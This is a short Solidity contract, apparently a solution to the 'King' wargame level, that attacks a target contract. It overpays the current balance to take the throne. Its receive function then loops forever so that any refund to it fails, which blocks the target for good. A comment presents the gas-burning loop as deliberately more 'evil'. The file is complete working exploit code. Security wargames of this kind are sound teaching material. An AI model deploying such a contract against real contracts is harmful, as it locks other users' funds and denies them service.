// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

   receive() external payable {
       // I could technically just do require(false), but if my
       // objective is to cause maximum grief, I think making the
       // victim spend all potential gas is more evil 😈
       while(true) {}
    }

    function hackContract() external {
        uint bareMinimum = contractAddress.balance + 1;
        contractAddress.call{value: bareMinimum, gas: 10000000}("");
    }
}
